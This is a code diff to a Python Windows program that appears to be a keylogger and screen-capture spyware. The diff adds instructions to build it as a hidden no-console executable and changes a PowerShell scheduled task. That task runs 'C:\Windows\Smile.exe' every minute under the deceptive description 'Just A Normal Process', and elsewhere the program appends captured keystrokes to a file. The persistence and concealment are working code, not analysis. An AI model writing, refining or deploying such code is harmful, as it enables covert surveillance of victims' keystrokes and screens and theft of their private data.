@@ -16,7 +16,12 @@ import uuid
 import subprocess
 
 
-TIMEOUT =  60*10
+# To compile into an executable, ensure requirement "pyinstaller" is downloaded.
+# Command: pyinstaller --onefile --noconsole .\<filename>
+#   Builds into one executable file with noconsole opening when application is ran.
+
+
+TIMEOUT =  50 #in seconds
 
 def get_dimensions():
     width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
@@ -131,12 +136,13 @@ if __name__ == '__main__':
     if not os.path.exists(pathname):
         os.mkdir(pathname)
         cmd = """
-        $action = New-ScheduledTaskAction -Execute "C:\Windows\Smile.exe" 
+        $action = New-ScheduledTaskAction -Execute "C:\\Windows\\Smile.exe" 
         $description = "Just A Normal Process"
-        $settings = New-ScheduledTaskSettingsSet -DeleteExpiredTaskAfter (New-TimeSpan -Seconds 2)
         $taskName = "SmileYoureOnCamera"
-        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days (365 * 20))
-        Register-ScheduledTask -TaskName $taskName -Description $description -Action $action -Settings $settings -Trigger $trigger | Out-Null
+        $trigger1 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
+        $trigger2 = New-ScheduledTaskTrigger -Once -At 00:00 -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Hours 23) 
+        $trigger1.Repetition = $trigger2.Repetition
+        Register-ScheduledTask -TaskName $taskName -Description $description -Action $action -Trigger $trigger1 | Out-Null
         """
     
         listProcess = [
@@ -156,7 +162,4 @@ if __name__ == '__main__':
 
     if os.path.exists(keystroke_path):
         with open(keystroke_path, 'a') as f:
-            f.write(run())
-
-
-    
+            f.write(run())  
